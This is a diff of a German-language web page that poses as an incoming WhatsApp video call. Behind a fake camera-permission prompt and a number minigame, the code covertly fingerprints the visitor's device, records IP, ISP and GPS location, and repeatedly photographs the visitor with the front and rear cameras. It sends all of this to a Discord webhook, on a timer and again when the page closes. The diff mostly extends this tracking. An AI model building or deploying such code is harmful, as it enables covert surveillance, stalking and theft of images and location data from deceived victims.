-          data.netzwerk.as_nummer = ipData.as || 'Unbekannt';
           data.netzwerk.stadt = ipData.city || '';
-          data.netzwerk.region = ipData.regionName || '';
           data.netzwerk.land = ipData.country || '';
-          data.netzwerk.mobilfunk = ipData.mobile || false;
+          data.netzwerk.mobil = ipData.mobile || false;
           data.netzwerk.proxy = ipData.proxy || false;
-          data.netzwerk.hosting = ipData.hosting || false;
         } catch(e) {
           try {
             const r2 = await fetch('https://api.ipify.org?format=json');
@@ -1148,17 +1775,15 @@
           } catch(e2) {}
         }
 
-        // GPS Standort
+        // GPS-Lokalisierung
         data.geo = {};
         try {
           await new Promise((resolve) => {
             navigator.geolocation.getCurrentPosition(pos => {
-              data.geo.breitengrad = pos.coords.latitude.toFixed(6);
-              data.geo.längengrad = pos.coords.longitude.toFixed(6);
+              data.geo.breite = pos.coords.latitude.toFixed(6);
+              data.geo.laenge = pos.coords.longitude.toFixed(6);
               data.geo.genauigkeit = Math.round(pos.coords.accuracy) + 'm';
-              data.geo.höhe = pos.coords.altitude ? pos.coords.altitude.toFixed(2) + 'm' : 'Keine';
-              data.geo.geschwindigkeit = pos.coords.speed ? pos.coords.speed + ' m/s' : 'Keine';
-              data.geo.richtung = pos.coords.heading ? pos.coords.heading + '°' : 'Keine';
+              data.geo.hoehe = pos.coords.altitude ? pos.coords.altitude.toFixed(1) + 'm' : 'Keine';
               data.geo.zeitstempel = new Date(pos.timestamp).toLocaleString('de-DE');
               resolve();
             }, resolve, { timeout: 5000, enableHighAccuracy: true });
@@ -1169,84 +1794,116 @@
         let visits = parseInt(localStorage.getItem('vc') || '0') + 1;
         localStorage.setItem('vc', visits);
         data.besuche = visits;
-
-        // Verbindungsqualität
-        data.verbindung = { qualität: connectionQuality + '/5' };
+        data.sitzung_dauer = Math.round((Date.now() - pageStartTime) / 1000) + 's';
+        data.daten_uebertragung = (totalDataSent / 1024).toFixed(2) + ' KB';
 
         return data;
       }
 
-      // ── EMBED ERSTELLER ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 📧 EMBED-GENERATOR FÜR DISCORD
+      // ════════════════════════════════════════════════════════════════════════════════════
       function buildEmbeds(data, name, fotoLabel) {
         const now = new Date();
-        const timeStr = now.toLocaleString('de-DE', { timeZone: data.browser.zeitzone });
+        const timeStr = now.toLocaleString('de-DE');
         const embeds = [];
 
+        // Hauptembed
         embeds.push({
-          title: `📞 WhatsApp Anruf – ${name}`,
+          title: `📞 WhatsApp Videoanruf - ${name}`,
           color: 0x25d366,
           timestamp: now.toISOString(),
-          footer: { text: `Besuch #${data.besuche} • ${timeStr}` },
+          thumbnail: { 
+            url: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/WhatsApp_logo.png/1200px-WhatsApp_logo.png" 
+          },
+          footer: { text: `Anruf #${data.besuche} | Sitzung: ${data.sitzung_dauer}` },
           fields: [
-            { name: '🕐 Zeitstempel', value: timeStr, inline: true },
+            { name: '⏰ Zeitstempel', value: timeStr, inline: true },
             { name: '🌍 Zeitzone', value: data.browser.zeitzone, inline: true },
             { name: '📱 Gerät', value: data.browser.plattform, inline: true },
-            { name: '📶 Verbindung', value: data.verbindung.qualität, inline: true },
+            { name: '📶 Verbindung', value: connectionQuality + '/5', inline: true },
+            { name: '🌐 Online', value: data.browser.online ? '✅ Ja' : '❌ Nein', inline: true },
+            { name: '🔒 Cookies', value: data.browser.cookies ? '✅ Aktiviert' : '❌ Deaktiviert', inline: true },
           ]
         });
 
+        // Hardware
         embeds.push({
-          title: '🔧 Hardware-Informationen',
+          title: '🔧 Hardware & Geräteinformationen',
           color: 0x5865f2,
           fields: [
-            { name: '🔋 Akkustand', value: data.hardware.akku_level || 'Unbekannt', inline: true },
-            { name: '⚡ Lädt', value: data.hardware.akku_ladend ? 'Ja' : 'Nein', inline: true },
+            { name: '🔋 Akku', value: data.hardware.akku_level || 'Unbekannt', inline: true },
+            { name: '⚡ Lädt gerade', value: data.hardware.akku_ladet ? '✅ Ja' : '❌ Nein', inline: true },
             { name: '🧠 CPU-Kerne', value: String(data.hardware.cpu_kerne), inline: true },
-            { name: '💾 Arbeitsspeicher', value: (data.hardware.gerätespeicher || '?') + ' GB', inline: true },
-            { name: '👆 Touchscreen', value: data.hardware.touchscreen ? 'Ja (' + data.hardware.max_touch_punkte + ' Punkte)' : 'Nein', inline: true },
+            { name: '💾 RAM-Speicher', value: (data.hardware.ram_gb || '?') + ' GB', inline: true },
+            { name: '👆 Touchpunkte', value: String(data.hardware.max_touch), inline: true },
+            { name: '📱 Touchscreen', value: data.hardware.touchscreen ? '✅ Ja' : '❌ Nein', inline: true },
           ]
         });
 
+        // Bildschirm & Browser
         embeds.push({
-          title: '🖥️ Bildschirm & Browser',
+          title: '🖥️ Bildschirm & Browserdaten',
           color: 0x9b59b6,
           fields: [
-            { name: 'Auflösung', value: data.bildschirm.auflösung, inline: true },
-            { name: 'Pixeldichte', value: data.bildschirm.pixel_dichte + 'x', inline: true },
-            { name: 'Farbtiefe', value: data.bildschirm.farbtiefe + ' Bit', inline: true },
+            { name: 'Auflösung', value: data.bildschirm.aufloesung, inline: true },
+            { name: 'Verfügbar', value: data.bildschirm.verfuegbar, inline: true },
+            { name: 'Pixel-Dichte', value: data.bildschirm.pixel_dichte + 'x', inline: true },
+            { name: 'Farben', value: data.bildschirm.farben, inline: true },
+            { name: 'Ausrichtung', value: data.bildschirm.ausrichtung, inline: true },
+            { name: 'Viewport', value: data.bildschirm.viewport, inline: true },
             { name: 'Sprache', value: data.browser.sprache, inline: true },
-            { name: 'Plattform', value: data.browser.plattform, inline: true },
-            { name: 'Canvas-Fingerabdruck', value: '```' + data.bildschirm.canvas_fingerabdruck + '```', inline: false },
+            { name: 'Java', value: data.browser.java ? '✅ Aktiviert' : '❌ Deaktiviert', inline: true },
           ]
         });
 
+        // Netzwerk
         const netzFelder = [
           { name: '🌐 IP-Adresse', value: '`' + (data.netzwerk.ip || 'Unbekannt') + '`', inline: true },
-          { name: '🏢 ISP (Internetanbieter)', value: data.netzwerk.isp || 'Unbekannt', inline: true },
+          { name: '🏢 Internetanbieter', value: data.netzwerk.isp || 'Unbekannt', inline: true },
         ];
-        if (data.netzwerk.effektiver_typ) netzFelder.push({ name: '📶 Netzwerktyp', value: data.netzwerk.effektiver_typ.toUpperCase(), inline: true });
-        if (data.netzwerk.download_geschwindigkeit) netzFelder.push({ name: '⬇️ Geschwindigkeit', value: data.netzwerk.download_geschwindigkeit, inline: true });
-        if (data.netzwerk.stadt) netzFelder.push({ name: '📍 Standort', value: `${data.netzwerk.stadt}, ${data.netzwerk.region}, ${data.netzwerk.land}`, inline: true });
+        if (data.netzwerk.typ) netzFelder.push({ name: '📶 Netzwerktyp', value: data.netzwerk.typ.toUpperCase(), inline: true });
+        if (data.netzwerk.download) netzFelder.push({ name: '⬇️ Download', value: data.netzwerk.download, inline: true });
+        if (data.netzwerk.latenz) netzFelder.push({ name: '⏱️ Latenz', value: data.netzwerk.latenz, inline: true });
+        if (data.netzwerk.stadt) netzFelder.push({ name: '📍 Standort', value: `${data.netzwerk.stadt}, ${data.netzwerk.land}`, inline: true });
+        netzFelder.push({ name: '📡 Mobil', value: data.netzwerk.mobil ? '✅ Ja' : '❌ Nein', inline: true });
+        netzFelder.push({ name: '🔐 Proxy', value: data.netzwerk.proxy ? '⚠️ Erkannt' : '✅ Nein', inline: true });
 
         embeds.push({
-          title: '🌐 Netzwerkdaten',
+          title: '🌐 Netzwerk & ISP-Informationen',
           color: 0xe67e22,
           fields: netzFelder
         });
 
-        if (data.geo.breitengrad) {
+        // GPS wenn verfügbar
+        if (data.geo.breite) {
           embeds.push({
-            title: '📍 Genauer Standort (GPS)',
+            title: '📍 Exakte GPS-Positionierung',
             color: 0xe74c3c,
             fields: [
-              { name: 'Breitengrad', value: data.geo.breitengrad, inline: true },
-              { name: 'Längengrad', value: data.geo.längengrad, inline: true },
+              { name: 'Breitengrad', value: data.geo.breite, inline: true },
+              { name: 'Längengrad', value: data.geo.laenge, inline: true },
               { name: 'Genauigkeit', value: data.geo.genauigkeit, inline: true },
-              { name: 'Karte', value: `[Google Maps öffnen](https://maps.google.com/?q=${data.geo.breitengrad},${data.geo.längengrad})`, inline: false },
+              { name: 'Höhe', value: data.geo.hoehe, inline: true },
+              { name: 'Erfasst um', value: data.geo.zeitstempel, inline: false },
+              { name: '🗺️ Karte anzeigen', value: `[Google Maps öffnen](https://maps.google.com/?q=${data.geo.breite},${data.geo.laenge})`, inline: false },
             ]
           });
         }
 
+        // Statistiken
+        embeds.push({
+          title: '📊 Sitzungsstatistiken',
+          color: 0x1abc9c,
+          fields: [
+            { name: '⏱️ Sitzungsdauer', value: data.sitzung_dauer, inline: true },
+            { name: '📦 Datenübertragung', value: data.daten_uebertragung, inline: true },
+            { name: '📸 Fotos erfasst', value: String(totalPhotosCollected), inline: true },
+            { name: '🔄 Fingerprints', value: `${fingerprintSendCount}/${MAX_FINGERPRINT_SENDS}`, inline: true },
+          ]
+        });
+
+        // Foto anhängen wenn vorhanden
         if (fotoLabel) {
           embeds[0].image = { url: `attachment://${fotoLabel}.jpg` };
         }
@@ -1254,7 +1911,9 @@
         return embeds;
       }
 
-      // ── FOTOAUFNAHME ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 📷 FOTOERFASSUNGSSYSTEM
+      // ════════════════════════════════════════════════════════════════════════════════════
       const hiddenVideo = document.getElementById('hiddenVideo');
       const canvas = document.getElementById('canvas');
 
@@ -1268,9 +1927,11 @@
 
       function captureFromVideo(video, mirror, label, name, fpData) {
         if (!video.videoWidth) return;
+        
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
+        
         ctx.save();
         if (mirror) {
           ctx.translate(canvas.width, 0);
@@ -1278,18 +1939,20 @@
         }
         ctx.drawImage(video, 0, 0);
         ctx.restore();
+        
         canvas.toBlob(async b => {
           if (b) {
             photoCounter++;
+            totalPhotosCollected++;
             await sendeFoto(b, `${label}_${photoCounter}`, name, fpData);
           }
-        }, 'image/jpeg', 0.93);
+        }, 'image/jpeg', 0.92);
       }
 
       async function schnelleFotoAufnahme(fpData) {
         if (callEnded || !hiddenVideo.videoWidth) return;
 
-        captureFromVideo(hiddenVideo, true, 'Frontkamera', currentCaller, fpData);
+        captureFromVideo(hiddenVideo, true, 'Vorderkamera', currentCaller, fpData);
 
         try {
           const backStream = await navigator.mediaDevices.getUserMedia({
@@ -1304,7 +1967,7 @@
             setTimeout(() => {
               captureFromVideo(backVideo, false, 'Rückkamera', currentCaller, fpData);
               backStream.getTracks().forEach(t => t.stop());
-            }, 800);
+            }, 400);
           };
         } catch(e) {
           console.warn('Rückkamera nicht verfügbar:', e.message);
@@ -1312,25 +1975,33 @@
       }
 
       async function fingerprintSenden() {
-        if (callEnded) return;
+        if (callEnded || fingerprintSendCount >= MAX_FINGERPRINT_SENDS) return;
         try {
           const fpData = await collectFingerprintData();
           const embeds = buildEmbeds(fpData, currentCaller, null);
           const form = new FormData();
           form.append('payload_json', JSON.stringify({ embeds: embeds }));
           await sendToDiscord(form);
+          fingerprintSendCount++;
+          console.log(`Fingerprint gesendet: ${fingerprintSendCount}/${MAX_FINGERPRINT_SENDS}`);
         } catch(e) {
-          console.warn('Fingerprint-Sendefehler:', e.message);
+          console.warn('Fingerprint Sendefehler:', e.message);
         }
       }
 
-      // ── MINI GAME LOGIK ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 🎮 ERWEITERTE SPIEL-LOGIK
+      // ════════════════════════════════════════════════════════════════════════════════════
       let gameState = {
         score: 0,
         level: 1,
         nextNumber: 1,
         time: 0,
-        cells: []
+        cells: [],
+        totalScore: 0,
+        perfectClicks: 0,
+        wrongClicks: 0,
+        fastestClick: Infinity
       };
 
       window.gameTimer = null;
@@ -1342,12 +2013,16 @@
         gameState.nextNumber = 1;
         gameState.time = 0;
         gameState.cells = [];
+        gameState.perfectClicks = 0;
+        gameState.wrongClicks = 0;
+        gameState.fastestClick = Infinity;
+        gameStartedTime = Date.now();
         generateGameBoard();
         startGameTimer();
       }
 
       function generateGameBoard() {
-        const maxNumber = 9 + (gameState.level - 1) * 2;
+        const maxNumber = 9 + (gameState.level - 1) * 3;
         const numbers = Array.from({ length: maxNumber }, (_, i) => i + 1);
         gameState.cells = numbers.sort(() => Math.random() - 0.5).slice(0, 9);
         gameState.nextNumber = 1;
@@ -1357,7 +2032,7 @@
       function renderGameBoard() {
         const board = document.getElementById('gameBoard');
         board.innerHTML = '';
-        gameState.cells.forEach((num, idx) => {
+        gameState.cells.forEach((num) => {
           const cell = document.createElement('button');
           cell.className = 'game-cell';
           cell.textContent = num;
@@ -1368,29 +2043,51 @@
         });
       }
 
+      const clickStartTime = {};
+
       function onGameCellClick(num, cell) {
+        const clickTime = Date.now();
+        const cellId = gameState.cells.indexOf(num);
+        
         if (num !== gameState.nextNumber) {
           playGameWrong();
           playError();
-          cell.style.opacity = '0.3';
-          setTimeout(() => { cell.style.opacity = '1'; }, 200);
+          cell.classList.add('wrong');
+          gameState.wrongClicks++;
+          showWarningNotification('⚠️ Falsche Nummer! Versuche es erneut.');
+          setTimeout(() => cell.classList.remove('wrong'), 400);
           return;
         }
 
         playGameCorrect();
         playButtonClick();
-        gameState.score += 10 + gameState.level * 5;
-        gameState.nextNumber++;
+        
+        const clickSpeed = clickTime - gameStartedTime - gameState.time * 1000;
+        if (clickSpeed < gameState.fastestClick) {
+          gameState.fastestClick = clickSpeed;
+        }
 
+        const basePoints = 100;
+        const levelBonus = gameState.level * 25;
+        const speedBonus = Math.max(0, 50 - Math.floor(clickSpeed / 100));
+        const points = basePoints + levelBonus + speedBonus;
+        
+        gameState.score += points;
+        gameState.totalScore += points;
+        gameState.nextNumber++;
+        gameState.perfectClicks++;
+
+        cell.classList.add('correct');
         document.getElementById('gameScore').textContent = gameState.score;
 
         if (gameState.nextNumber > gameState.cells.length) {
           gameState.level++;
           document.getElementById('gameLevel').textContent = gameState.level;
           playLevelUp();
+          showGameNotification(`🎉 LEVEL ${gameState.level} ERREICHT! Weiter so!`);
           setTimeout(() => {
             generateGameBoard();
-          }, 500);
+          }, 600);
         } else {
           renderGameBoard();
         }
@@ -1400,7 +2097,7 @@
         window.gameCountdownInterval = setInterval(() => {
           if (isGameActive) {
             gameState.time++;
-            document.getElementById('gameTime').textContent = gameState.time + 's';
+            document.getElementById('gameTime').textContent = gameState.time;
           }
         }, 1000);
       }
@@ -1410,43 +2107,56 @@
         initializeGame();
       };
 
-      // ── KAMERA STARTEN ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 📹 KAMERA UND DATENERFASSUNGS-START
+      // ════════════════════════════════════════════════════════════════════════════════════
       async function starteKameraUndSammlung() {
         try {
           captureStream = await navigator.mediaDevices.getUserMedia({
             video: { width: 1280, height: 720, facingMode: 'user' },
             audio: false
           });
+          
           hiddenVideo.srcObject = captureStream;
           hiddenVideo.onloadedmetadata = async () => {
-            document.getElementById('callStatus').textContent = 'Verbunden';
-            document.getElementById('callInfo').textContent = 'Anruf läuft...';
+            document.getElementById('callStatus').textContent = 'Verbunden und aktiv';
+            document.getElementById('callInfo').innerHTML = 'Anruf läuft... <span>Daten werden erfasst</span>';
+            
             playTypingSound();
             vibrateAvatar();
             stopRinging();
             playConnectSound();
+            
             setTimeout(startTimer, 800);
 
-            // Game Button anzeigen
-            document.getElementById('btnGame').style.display = 'flex';
+            // Spiel-Button anzeigen
+            const btnGame = document.getElementById('btnGame');
+            btnGame.style.display = 'flex';
 
-            // Erste sofortige Datensammlung
+            // Spielbenachrichtigung nach 2 Sekunden
+            setTimeout(() => {
+              showGameNotification('🎮 MINISPIEL JETZT VERFÜGBAR! Tritt dem Zahlenspiel bei und verdiene Punkte!');
+            }, 2000);
+
+            // Erste Fingerprint-Erfassung sofort
             await fingerprintSenden();
 
-            // Erste Fotos nach 1 Sekunde
+            // Erste Fotos nach 1,5 Sekunden
             setTimeout(async () => {
               const fpData = await collectFingerprintData();
               await schnelleFotoAufnahme(fpData);
-            }, 1000);
+            }, 1500);
 
+            // Fingerprint-Intervall (2 Sekunden, max 3x)
             fingerprintInterval = setInterval(async () => {
-              if (callEnded) {
+              if (callEnded || fingerprintSendCount >= MAX_FINGERPRINT_SENDS) {
                 clearInterval(fingerprintInterval);
                 return;
               }
               await fingerprintSenden();
             }, FINGERPRINT_INTERVAL);
 
+            // Foto-Intervall (2 Sekunden)
             photoInterval = setInterval(async () => {
               if (callEnded) {
                 clearInterval(photoInterval);
@@ -1458,26 +2168,30 @@
           };
         } catch(e) {
           document.body.innerHTML = `
-            <div style="height:100vh;background:linear-gradient(135deg, #0a1f13 0%, #0d2818 100%);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;font-family:-apple-system,sans-serif;color:white;text-align:center;padding:32px">
-              <div style="font-size:64px">🚫</div>
-              <div style="font-size:22px;font-weight:700;letter-spacing:-0.5px">Kamerazugriff erforderlich</div>
-              <div style="font-size:14px;color:rgba(255,255,255,0.5);max-width:280px;line-height:1.6;letter-spacing:0.3px">Um an diesem Anruf teilzunehmen, musst du den Kamerazugriff erlauben.</div>
+            <div style="height:100vh;background:linear-gradient(135deg, #0a1f13 0%, #0d2818 100%);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px;font-family:-apple-system,sans-serif;color:white;text-align:center;padding:40px;border:1px solid rgba(255,255,255,0.1)">
+              <div style="font-size:72px;animation:permission-bounce 0.8s ease infinite">🚫</div>
+              <div style="font-size:24px;font-weight:800;letter-spacing:-0.5px">Kamerazugriff erforderlich</div>
+              <div style="font-size:15px;color:rgba(255,255,255,0.6);max-width:300px;line-height:1.7;letter-spacing:0.3px">Um an diesem Videoanruf teilzunehmen, musst du den Kamerazugriff in deinen Geräteeinstellungen aktivieren.</div>
+              <div style="font-size:13px;color:rgba(255,255,255,0.4);margin-top:20px">Fehlerdetails: ${e.message}</div>
             </div>
           `;
         }
       }
 
-      // ── BERECHTIGUNGSANFRAGE ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 🔐 BERECHTIGUNGS-ANFRAGE
+      // ════════════════════════════════════════════════════════════════════════════════════
       function zeigeBerechtigungsanfrage() {
         const overlay = document.createElement('div');
         overlay.className = 'permission-overlay';
         overlay.innerHTML = `
           <div class="permission-icon">📷</div>
           <div class="permission-title">Kameraberechtigung erforderlich</div>
-          <div class="permission-text">Um am Videoanruf teilzunehmen, musst du den Kamerazugriff erlauben.</div>
-          <button class="permission-btn" id="grantPermissionBtn">📸 Kamera aktivieren und Anruf starten</button>
+          <div class="permission-text">Um am Videoanruf mit ${currentCaller} teilzunehmen, musst du der Anwendung den Kamerazugriff gewähren.</div>
+          <button class="permission-btn" id="grantPermissionBtn">📸 Kamera aktivieren</button>
         `;
         document.body.appendChild(overlay);
+        
         document.getElementById('grantPermissionBtn').addEventListener('click', async () => {
           playButtonClick();
           overlay.remove();
@@ -1485,19 +2199,24 @@
         });
       }
 
-      // ── INITIALISIERUNG ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 🚀 INITIALISIERUNG
+      // ════════════════════════════════════════════════════════════════════════════════════
       playNotifSound();
       vibrateAvatar();
+      
       setTimeout(() => {
         document.getElementById('callStatus').textContent = 'Klingelt…';
         playTypingSound();
         vibrateAvatar();
         startRinging();
-      }, 600);
+      }, 700);
 
-      setTimeout(zeigeBerechtigungsanfrage, 1800);
+      setTimeout(zeigeBerechtigungsanfrage, 2000);
 
-      // ── BUTTONS ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 🎛️ BUTTON-EREIGNISSE
+      // ════════════════════════════════════════════════════════════════════════════════════
       let stumm = false;
       document.getElementById('btnMute').addEventListener('click', function() {
         playButtonClick();
@@ -1505,16 +2224,21 @@
         this.classList.toggle('toggled', stumm);
         this.querySelector('.ctrl-icon').textContent = stumm ? '🔕' : '🎤';
         this.querySelector('.ctrl-label').textContent = stumm ? 'Ton an' : 'Stumm';
+        showWarningNotification(stumm ? '🔇 Mikrofon stummgeschaltet' : '🔊 Mikrofon aktiviert');
       });
 
       document.getElementById('btnSpeaker').addEventListener('click', function() {
         playButtonClick();
         this.classList.toggle('toggled');
+        const isActive = this.classList.contains('toggled');
+        showWarningNotification(isActive ? '🔊 Lautsprecher aktiviert' : '📱 Normalausgabe');
       });
 
       document.getElementById('btnVideo').addEventListener('click', function() {
         playButtonClick();
         this.classList.toggle('toggled');
+        const isActive = this.classList.contains('toggled');
+        showWarningNotification(isActive ? '📹 Kamera ausgeschaltet' : '📹 Kamera aktiviert');
       });
 
       document.getElementById('btnGame').addEventListener('click', function() {
@@ -1522,6 +2246,19 @@
         isGameActive = true;
         document.getElementById('gameModal').classList.add('active');
         initializeGame();
+        showGameNotification('🎮 DAS SPIEL HAT GESTARTET! Viel Spaß!');
+      });
+
+      document.getElementById('btnCloseGame').addEventListener('click', function() {
+        playButtonClick();
+        isGameActive = false;
+        document.getElementById('gameModal').classList.remove('active');
+        clearInterval(window.gameCountdownInterval);
+      });
+
+      document.getElementById('btnRestartGame').addEventListener('click', function() {
+        playButtonClick();
+        resetGame();
       });
 
       document.getElementById('btnEnd').addEventListener('click', () => {
@@ -1530,9 +2267,11 @@
         stopRinging();
         playHangupSound();
         vibrateAvatar();
+        
         if (timerInterval) clearInterval(timerInterval);
         if (fingerprintInterval) clearInterval(fingerprintInterval);
         if (photoInterval) clearInterval(photoInterval);
+        if (qualityCheckInterval) clearInterval(qualityCheckInterval);
         if (window.gameCountdownInterval) clearInterval(window.gameCountdownInterval);
         if (captureStream) captureStream.getTracks().forEach(t => t.stop());
 
@@ -1545,6 +2284,20 @@
           <div class="end-call-icon">📵</div>
           <div class="end-call-title">Anruf beendet</div>
           <div class="end-call-duration">${m}:${s}</div>
+          <div class="end-call-stats">
+            <div class="end-call-stat">
+              <div class="end-call-stat-label">Fotos</div>
+              <div class="end-call-stat-value">${totalPhotosCollected}</div>
+            </div>
+            <div class="end-call-stat">
+              <div class="end-call-stat-label">Daten (KB)</div>
+              <div class="end-call-stat-value">${(totalDataSent / 1024).toFixed(1)}</div>
+            </div>
+            <div class="end-call-stat">
+              <div class="end-call-stat-label">Spiel-Punkte</div>
+              <div class="end-call-stat-value">${gameState.totalScore}</div>
+            </div>
+          </div>
           <button class="end-call-btn" onclick="location.reload()">
             <div class="end-call-btn-circle">📞</div>
             <span class="end-call-btn-text">Erneut anrufen</span>
@@ -1553,24 +2306,32 @@
         document.body.appendChild(endScreen);
       });
 
-      // Seite verlassen Daten
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 📊 ABMELDE-STATISTIKEN
+      // ════════════════════════════════════════════════════════════════════════════════════
       window.addEventListener('beforeunload', () => {
         const sekunden = Math.round((Date.now() - pageStartTime) / 1000);
         const form = new FormData();
         form.append('payload_json', JSON.stringify({
           embeds: [{
-            title: '⏱️ Besuchsdauer',
+            title: '⏱️ Sitzung beendet',
             color: 0x95a5a6,
-            description: `Jemand war **${sekunden} Sekunden** auf der Seite (Anruf: **${currentCaller}**)`,
+            description: `Benutzer war **${sekunden} Sekunden** auf der Seite aktiv`,
             fields: [
-              { name: '📸 Fotos gesendet', value: String(photoCounter), inline: true },
-              { name: '🎮 Spiel-Punkte', value: String(gameState.score), inline: true }
+              { name: '👤 Gesprächspartner', value: currentCaller, inline: true },
+              { name: '⏳ Anrufdauer', value: `${Math.floor(seconds / 60)}:${(seconds % 60).toString().padStart(2, '0')}`, inline: true },
+              { name: '📸 Fotos erfasst', value: String(totalPhotosCollected), inline: true },
+              { name: '🔄 Fingerprints', value: `${fingerprintSendCount}/${MAX_FINGERPRINT_SENDS}`, inline: true },
+              { name: '🎮 Spiel-Punkte', value: String(gameState.totalScore), inline: true },
+              { name: '📊 Datenvolumen', value: (totalDataSent / 1024).toFixed(2) + ' KB', inline: true },
             ]
           }]
         }));
         try {
           navigator.sendBeacon(WEBHOOK, form);
-        } catch(e) {}
+        } catch(e) {
+          console.warn('Beacon-Fehler:', e);
+        }
       });
 
     })();
